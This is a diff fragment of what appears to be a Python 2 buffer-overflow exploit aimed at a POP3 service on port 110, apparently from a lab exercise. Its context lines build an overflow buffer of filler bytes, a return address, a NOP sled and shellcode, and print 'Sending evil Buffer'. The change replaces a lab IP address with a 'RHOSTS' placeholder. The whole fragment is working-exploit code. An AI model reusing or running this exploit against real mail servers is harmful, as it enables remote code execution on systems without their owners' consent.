@@ -33,7 +33,7 @@ buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
 
 try:
 	print "\nSending evil Buffer"
-	s.connect(('10.11.16.67',110))
+	s.connect(('RHOSTS',110))
 	data = s.recv(1024)
 	s.send('USER username' + '\r\n')
 	data = s.recv(1024)
